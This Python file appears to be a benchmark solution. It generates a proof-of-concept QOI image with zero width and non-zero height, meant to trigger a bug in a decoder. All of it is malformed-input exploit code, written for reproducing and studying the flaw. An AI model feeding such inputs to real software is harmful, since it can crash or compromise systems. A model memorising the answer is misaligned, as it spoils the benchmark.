import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._qoi_zero_dimension_poc()

    def _qoi_zero_dimension_poc(self) -> bytes:
        # QOI header
        magic = b"qoif"
        width = (0).to_bytes(4, "big")   # zero width to trigger the bug
        height = (1).to_bytes(4, "big")  # non-zero height
        channels = b"\x04"               # RGBA
        colorspace = b"\x00"             # sRGB with linear alpha
        header = magic + width + height + channels + colorspace

        # Minimal pixel data: QOI_OP_RGB (0xFE) + 3 bytes of RGB
        pixel_data = b"\xFE\xFF\x00\x00"  # one red pixel

        # QOI end marker
        end_marker = b"\x00" * 7 + b"\x01"

        return header + pixel_data + end_marker